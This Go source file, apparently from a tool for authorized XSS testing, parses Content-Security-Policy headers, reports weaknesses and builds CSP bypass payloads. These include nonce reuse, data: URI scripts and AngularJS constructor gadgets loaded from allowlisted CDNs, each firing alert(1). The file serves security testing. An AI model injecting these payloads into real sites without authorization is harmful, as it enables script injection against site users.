// Package csp implements Content-Security-Policy detection, weakness analysis
// and bypass technique generation for authorized XSS testing.
package csp

import (
	"fmt"
	"strings"

	"github.com/zapstiko/xsshunts/utils"
)

// Policy is a parsed Content-Security-Policy (headers and meta tags).
type Policy struct {
	EnforcedHeaders      []string
	ReportOnlyHeaders    []string
	MetaPolicies         []string
	Directives           map[string][]string
	ReportOnlyDirectives map[string][]string
	Nonces               []string
	AngularInPage        bool
	PHP                  bool
}

// Issue is one CSP weakness or observation.
type Issue struct {
	Severity  string // high | medium | low | info
	Directive string
	Message   string
}

// Analysis is the evaluated CSP posture and applicable bypasses.
type Analysis struct {
	Policy         *Policy
	Present        bool
	Enforced       bool
	ReportOnlyOnly bool

	ScriptDirective string
	ScriptSources   []string
	Unrestricted    bool
	InlineAllowed   bool
	UnsafeEval      bool
	UnsafeHashes    bool
	StrictDynamic   bool
	DataAllowed     bool
	BlobAllowed     bool
	Wildcard        bool

	MissingBaseURI         bool
	MissingObjectSrc       bool
	MissingFormAction      bool
	MissingFrameAncestors  bool
	TrustedTypesReportOnly bool

	Nonces        []string
	AngularURL    string
	AngularInPage bool
	AllowedHosts  []string
	WildcardHosts []string
	FrameHosts    []string
	ThirdParty    []string
	PHP           bool
	HasReport     bool
	Issues        []Issue
	Techniques    []Technique
}

// Parse extracts CSP policies from response headers, meta tags and DOM nonces.
func Parse(headers map[string]string, html string) *Policy {
	p := &Policy{
		Directives:           map[string][]string{},
		ReportOnlyDirectives: map[string][]string{},
	}

	for key, value := range headers {
		switch strings.ToLower(strings.TrimSpace(key)) {
		case "content-security-policy":
			p.EnforcedHeaders = append(p.EnforcedHeaders, value)
		case "content-security-policy-report-only":
			p.ReportOnlyHeaders = append(p.ReportOnlyHeaders, value)
		}
	}

	root := utils.ParseHTML(html)
	if root != nil {
		for _, meta := range utils.AllElements(root, "meta") {
			if strings.EqualFold(strings.TrimSpace(utils.GetAttr(meta, "http-equiv")), "Content-Security-Policy") {
				if content := strings.TrimSpace(utils.GetAttr(meta, "content")); content != "" {
					p.MetaPolicies = append(p.MetaPolicies, content)
				}
			}
		}
		for _, script := range utils.AllElements(root, "script") {
			if nonce := strings.TrimSpace(utils.GetAttr(script, "nonce")); nonce != "" {
				p.Nonces = appendUnique(p.Nonces, nonce)
			}
		}
	}

	for _, raw := range p.ReportOnlyHeaders {
		parseDirectives(raw, p.ReportOnlyDirectives)
	}
	for _, raw := range append(append([]string{}, p.EnforcedHeaders...), p.MetaPolicies...) {
		parseDirectives(raw, p.Directives)
	}
	lowerHTML := strings.ToLower(html)
	p.AngularInPage = strings.Contains(lowerHTML, "ng-app") || strings.Contains(lowerHTML, "angular.min.js") ||
		strings.Contains(lowerHTML, "angular.js")
	for key, value := range headers {
		lowerKey, lowerValue := strings.ToLower(key), strings.ToLower(value)
		if (lowerKey == "x-powered-by" && strings.Contains(lowerValue, "php")) ||
			(lowerKey == "set-cookie" && strings.Contains(lowerValue, "phpsessid")) {
			p.PHP = true
		}
	}
	for _, token := range flatten(p.Directives) {
		lower := strings.ToLower(token)
		if strings.HasPrefix(lower, "'nonce-") && strings.HasSuffix(lower, "'") {
			nonce := strings.TrimSuffix(strings.TrimPrefix(lower, "'nonce-"), "'")
			p.Nonces = appendUnique(p.Nonces, nonce)
		}
	}
	return p
}

func parseDirectives(raw string, directives map[string][]string) {
	for _, part := range strings.Split(raw, ";") {
		fields := strings.Fields(part)
		if len(fields) == 0 {
			continue
		}
		name := strings.ToLower(fields[0])
		if name == "" {
			continue
		}
		directives[name] = append(directives[name], fields[1:]...)
	}
}

func flatten(directives map[string][]string) []string {
	var out []string
	for _, values := range directives {
		out = append(out, values...)
	}
	return out
}

func appendUnique(items []string, value string) []string {
	for _, item := range items {
		if item == value {
			return items
		}
	}
	return append(items, value)
}

// Analyze evaluates a parsed policy and produces issues plus applicable techniques.
func Analyze(p *Policy) *Analysis {
	a := &Analysis{Policy: p}
	a.Enforced = len(p.EnforcedHeaders) > 0 || len(p.MetaPolicies) > 0
	a.ReportOnlyOnly = !a.Enforced && len(p.ReportOnlyHeaders) > 0
	a.Present = a.Enforced || len(p.ReportOnlyHeaders) > 0

	var sources []string
	for _, name := range []string{"script-src-elem", "script-src", "default-src"} {
		if values, ok := p.Directives[name]; ok {
			a.ScriptDirective = name
			sources = values
			break
		}
	}
	a.ScriptSources = sources
	if a.ScriptDirective == "" {
		a.Unrestricted = true
	}

	hasToken := func(token string) bool {
		for _, src := range sources {
			if strings.EqualFold(src, token) {
				return true
			}
		}
		return false
	}

	a.InlineAllowed = a.Unrestricted || hasToken("'unsafe-inline'")
	a.UnsafeEval = hasToken("'unsafe-eval'")
	a.UnsafeHashes = hasToken("'unsafe-hashes'")
	a.StrictDynamic = hasToken("'strict-dynamic'")
	a.DataAllowed = hasToken("data:")
	a.BlobAllowed = hasToken("blob:")
	a.Wildcard = hasToken("*") || hasToken("http:") || hasToken("https:")

	a.Nonces = append([]string(nil), p.Nonces...)
	a.AngularInPage = p.AngularInPage
	a.PHP = p.PHP
	a.AllowedHosts = extractHosts(sources)
	a.WildcardHosts = wildcardHosts(sources)
	var frameSources []string
	for _, name := range []string{"frame-src", "child-src", "default-src"} {
		if values, ok := p.Directives[name]; ok {
			frameSources = values
			break
		}
	}
	a.FrameHosts = extractHosts(frameSources)
	a.ThirdParty = thirdPartyHosts(a.AllowedHosts)
	a.AngularURL = findAngularURL(sources)
	_, hasReportURI := p.Directives["report-uri"]
	_, hasReportTo := p.Directives["report-to"]
	a.HasReport = hasReportURI || hasReportTo || len(p.ReportOnlyHeaders) > 0

	if a.Enforced {
		if _, ok := p.Directives["base-uri"]; !ok {
			a.MissingBaseURI = true
		}
		if _, ok := p.Directives["object-src"]; !ok {
			if _, hasDefault := p.Directives["default-src"]; !hasDefault {
				a.MissingObjectSrc = true
			}
		}
		if _, ok := p.Directives["form-action"]; !ok {
			a.MissingFormAction = true
		}
		if _, ok := p.Directives["frame-ancestors"]; !ok {
			a.MissingFrameAncestors = true
		}
	}
	if _, ok := p.ReportOnlyDirectives["require-trusted-types-for"]; ok {
		a.TrustedTypesReportOnly = true
	}

	a.buildIssues()
	a.Techniques = selectTechniques(a)
	return a
}

func (a *Analysis) buildIssues() {
	add := func(severity, directive, message string) {
		a.Issues = append(a.Issues, Issue{Severity: severity, Directive: directive, Message: message})
	}

	if !a.Present {
		add("info", "", "No Content-Security-Policy detected")
		return
	}
	if a.ReportOnlyOnly {
		add("high", "", "CSP is Report-Only and not enforced by the browser")
	}
	if a.Unrestricted {
		add("high", "script-src", "No script-src/default-src directive: scripts are unrestricted")
	}
	if a.InlineAllowed && !a.Unrestricted {
		if len(a.Nonces) > 0 || a.StrictDynamic {
			add("medium", "script-src", "'unsafe-inline' present but ignored when nonces/hashes or 'strict-dynamic' are used (CSP3)")
		} else {
			add("high", "script-src", "script-src allows 'unsafe-inline'")
		}
	}
	if a.UnsafeEval {
		add("medium", "script-src", "script-src allows 'unsafe-eval'")
	}
	if a.Wildcard {
		add("high", "script-src", "script-src contains a wildcard or broad scheme source")
	}
	if a.DataAllowed {
		add("high", "script-src", "script-src allows data: scripts")
	}
	if a.BlobAllowed {
		add("medium", "script-src", "script-src allows blob: scripts")
	}
	if a.UnsafeHashes {
		add("medium", "script-src", "'unsafe-hashes' allows hashed inline event handlers")
	}
	if a.StrictDynamic {
		add("info", "script-src", "'strict-dynamic' present: host allowlists are ignored; gadgets/trusted loaders may load scripts")
	}
	if len(a.Nonces) > 0 {
		add("info", "script-src", "Nonce-based CSP detected; nonces visible in the DOM can be reused in injected scripts")
	}
	if len(a.AllowedHosts) > 0 {
		add("info", "script-src", "Script allowlist: "+strings.Join(a.AllowedHosts, ", "))
	}
	if a.MissingBaseURI {
		add("medium", "base-uri", "base-uri is missing: injected <base> can hijack relative script URLs")
	}
	if a.MissingObjectSrc {
		add("low", "object-src", "object-src is missing (legacy plugin-based bypasses may apply)")
	}
	if a.MissingFormAction {
		add("low", "form-action", "form-action is missing (credential-theft/form hijacking techniques may apply)")
	}
	if a.MissingFrameAncestors {
		add("low", "frame-ancestors", "frame-ancestors is missing (clickjacking / frame-based techniques may apply)")
	}
	if a.TrustedTypesReportOnly {
		add("medium", "require-trusted-types-for", "Trusted Types is Report-Only and does not block DOM XSS")
	}
	if len(a.WildcardHosts) > 0 {
		add("medium", "script-src", "Wildcard subdomain allowlist: "+strings.Join(a.WildcardHosts, ", "))
	}
}

func extractHosts(sources []string) []string {
	var hosts []string
	for _, src := range sources {
		lower := strings.ToLower(strings.TrimSpace(src))
		if lower == "" || strings.HasPrefix(lower, "'") || lower == "*" || lower == "http:" || lower == "https:" || lower == "data:" || lower == "blob:" {
			continue
		}
		host := lower
		if i := strings.Index(host, "://"); i >= 0 {
			host = host[i+3:]
		}
		host = strings.SplitN(host, "/", 2)[0]
		if strings.HasPrefix(host, "*.") {
			host = host[2:]
		}
		if host != "" {
			hosts = appendUnique(hosts, host)
		}
	}
	return hosts
}

var thirdPartyPatterns = []string{
	"cloudfront.net", "amazonaws.com", "azurewebsites.net", "azurestaticapps.net",
	"herokuapp.com", "firebaseapp.com", "jsdelivr.net", "cdnjs.cloudflare.com",
	"googleapis.com", "unpkg.com", "google.com", "youtube.com", "facebook.com", "hotjar.com",
}

func thirdPartyHosts(hosts []string) []string {
	var out []string
	for _, host := range hosts {
		for _, pattern := range thirdPartyPatterns {
			if strings.HasSuffix(host, pattern) {
				out = appendUnique(out, host)
				break
			}
		}
	}
	return out
}

type angularProvider struct {
	host string
	url  string
}

var angularProviders = []angularProvider{
	{"cdnjs.cloudflare.com", "https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"},
	{"ajax.googleapis.com", "https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"},
	{"cdn.jsdelivr.net", "https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"},
	{"unpkg.com", "https://unpkg.com/angular@1.8.2/angular.min.js"},
	{"code.angularjs.org", "https://code.angularjs.org/1.8.2/angular.min.js"},
}

func findAngularURL(sources []string) string {
	for _, src := range sources {
		lower := strings.ToLower(src)
		if strings.Contains(lower, "angular") && (strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://")) {
			return src
		}
	}
	for _, provider := range angularProviders {
		for _, src := range sources {
			if sourceAllowsHost(src, provider.host) {
				return provider.url
			}
		}
	}
	return ""
}

func sourceAllowsHost(src, host string) bool {
	s := strings.ToLower(strings.TrimSpace(src))
	if s == "*" || s == "https:" || s == "http:" {
		return true
	}
	if s == "" || strings.HasPrefix(s, "'") {
		return false
	}
	if i := strings.Index(s, "://"); i >= 0 {
		s = s[i+3:]
	}
	s = strings.SplitN(s, "/", 2)[0]
	s = strings.SplitN(s, ":", 2)[0]
	s = strings.TrimPrefix(s, "*.")
	host = strings.ToLower(host)
	return s == host || strings.HasSuffix(host, "."+s)
}

func selectTechniques(a *Analysis) []Technique {
	var keys []string
	if !a.Present {
		keys = append(keys, "no_csp")
	}
	if a.ReportOnlyOnly {
		keys = append(keys, "report_only")
	}
	if a.Unrestricted || a.InlineAllowed {
		keys = append(keys, "unsafe_inline")
	}
	if a.UnsafeEval {
		keys = append(keys, "unsafe_eval")
	}
	if len(a.Nonces) > 0 {
		keys = append(keys, "nonce_reuse")
	}
	if a.StrictDynamic {
		keys = append(keys, "strict_dynamic")
	}
	if a.Wildcard {
		keys = append(keys, "wildcard")
	}
	if a.DataAllowed {
		keys = append(keys, "data_uri")
	}
	if a.BlobAllowed {
		keys = append(keys, "blob_uri")
	}
	if a.UnsafeHashes {
		keys = append(keys, "unsafe_hashes")
	}
	if a.AngularInPage {
		keys = append(keys, "angular_dom")
	}
	if a.AngularURL != "" {
		keys = append(keys, "angular_cdn", "angular_library_gadgets")
	}
	if len(a.AllowedHosts) > 0 {
		keys = append(keys, "jsonp")
	}
	if a.MissingBaseURI {
		keys = append(keys, "base_uri")
	}
	if a.MissingObjectSrc {
		keys = append(keys, "object_src")
	}
	if len(a.ThirdParty) > 0 {
		keys = append(keys, "third_party")
	}
	if a.Enforced {
		keys = append(keys, "self_upload", "path_redirect", "policy_injection", "dom_xss", "service_worker", "header_injection")
	}
	if _, ok := a.Policy.Directives["require-trusted-types-for"]; ok {
		keys = append(keys, "trusted_types")
	}
	if a.TrustedTypesReportOnly {
		keys = append(keys, "trusted_types_report_only")
	}
	if a.MissingFormAction {
		keys = append(keys, "form_action")
	}
	if a.MissingFrameAncestors {
		keys = append(keys, "frame_ancestors")
	}
	if a.MissingBaseURI {
		keys = append(keys, "dangling_markup")
	}
	if len(a.WildcardHosts) > 0 {
		keys = append(keys, "wildcard_subdomain_takeover")
	}
	if a.HasReport {
		keys = append(keys, "csp_report_exfil")
	}
	if a.PHP {
		keys = append(keys, "php_header_strip")
	}
	if hasAllowedHostSuffix(a.AllowedHosts, "google.com") {
		keys = append(keys, "google_recaptcha_gadget")
	}
	if hasAnyAllowedHostSuffix(a.AllowedHosts, "google-analytics.com", "googletagmanager.com", "facebook.com", "hotjar.com") {
		keys = append(keys, "analytics_gadgets")
	}
	if len(a.FrameHosts) > 0 {
		keys = append(keys, "frame_src_allowlist")
	}

	var out []Technique
	seen := map[string]bool{}
	for _, key := range keys {
		if seen[key] {
			continue
		}
		seen[key] = true
		if technique, ok := techniqueByKey(key); ok {
			out = append(out, technique)
		}
	}
	return out
}

func wildcardHosts(sources []string) []string {
	var out []string
	for _, src := range sources {
		lower := strings.ToLower(strings.TrimSpace(src))
		if i := strings.Index(lower, "://"); i >= 0 {
			lower = lower[i+3:]
		}
		if !strings.HasPrefix(lower, "*.") {
			continue
		}
		host := strings.TrimPrefix(lower, "*.")
		host = strings.SplitN(host, "/", 2)[0]
		host = strings.SplitN(host, ":", 2)[0]
		if host != "" {
			out = appendUnique(out, host)
		}
	}
	return out
}

func hasAllowedHostSuffix(hosts []string, suffix string) bool {
	for _, host := range hosts {
		if host == suffix || strings.HasSuffix(host, "."+suffix) {
			return true
		}
	}
	return false
}

func hasAnyAllowedHostSuffix(hosts []string, suffixes ...string) bool {
	for _, suffix := range suffixes {
		if hasAllowedHostSuffix(hosts, suffix) {
			return true
		}
	}
	return false
}

// BypassPayload is one dialog-verifiable CSP bypass payload.
type BypassPayload struct {
	Key           string
	Name          string
	Technique     string
	Payload       string
	DialogType    string
	ExpectedValue int
}

// BypassPayloads returns payloads applicable to the analyzed policy.
// includeInline adds plain inline-script payloads when inline execution is allowed.
func BypassPayloads(a *Analysis, includeInline bool) []BypassPayload {
	var out []BypassPayload
	if a == nil || !a.Enforced {
		return out
	}

	if len(a.Nonces) > 0 {
		nonce := sanitizeNonce(a.Nonces[0])
		if nonce != "" {
			out = append(out, BypassPayload{
				Key: "nonce_reuse", Name: "CSP nonce reuse", Technique: "nonce_reuse",
				Payload:    fmt.Sprintf(`<script nonce="%s">alert(1)</script>`, nonce),
				DialogType: "alert", ExpectedValue: 1,
			})
		}
	}
	if a.DataAllowed {
		out = append(out, BypassPayload{
			Key: "data_uri", Name: "data: script source", Technique: "data_uri",
			Payload:    `<script src="data:text/javascript,alert(1)"></script>`,
			DialogType: "alert", ExpectedValue: 1,
		})
	}
	if a.AngularInPage {
		out = append(out, BypassPayload{
			Key: "angular_dom", Name: "AngularJS in-page gadget", Technique: "angular_dom",
			Payload:    `<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`,
			DialogType: "alert", ExpectedValue: 1,
		})
	}
	if a.AngularURL != "" {
		out = append(out, BypassPayload{
			Key: "angular_cdn", Name: "AngularJS CDN gadget", Technique: "angular_cdn",
			Payload: fmt.Sprintf(
				`<script src="%s"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`,
				a.AngularURL,
			),
			DialogType: "alert", ExpectedValue: 1,
		})
		out = append(out, BypassPayload{
			Key: "angular_cdn_eval", Name: "AngularJS CDN gadget ($eval)", Technique: "angular_cdn",
			Payload: fmt.Sprintf(
				`<script src="%s"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`,
				a.AngularURL,
			),
			DialogType: "alert", ExpectedValue: 1,
		})
	}
	if includeInline && a.InlineAllowed && !a.StrictDynamic && len(a.Nonces) == 0 {
		out = append(out, BypassPayload{
			Key: "inline_script", Name: "inline script", Technique: "unsafe_inline",
			Payload:    `<script>alert(1)</script>`,
			DialogType: "alert", ExpectedValue: 1,
		})
	}
	return out
}

func sanitizeNonce(nonce string) string {
	var b strings.Builder
	for _, r := range nonce {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '+', r == '/', r == '=', r == '-', r == '_':
			b.WriteRune(r)
		}
	}
	return b.String()
}
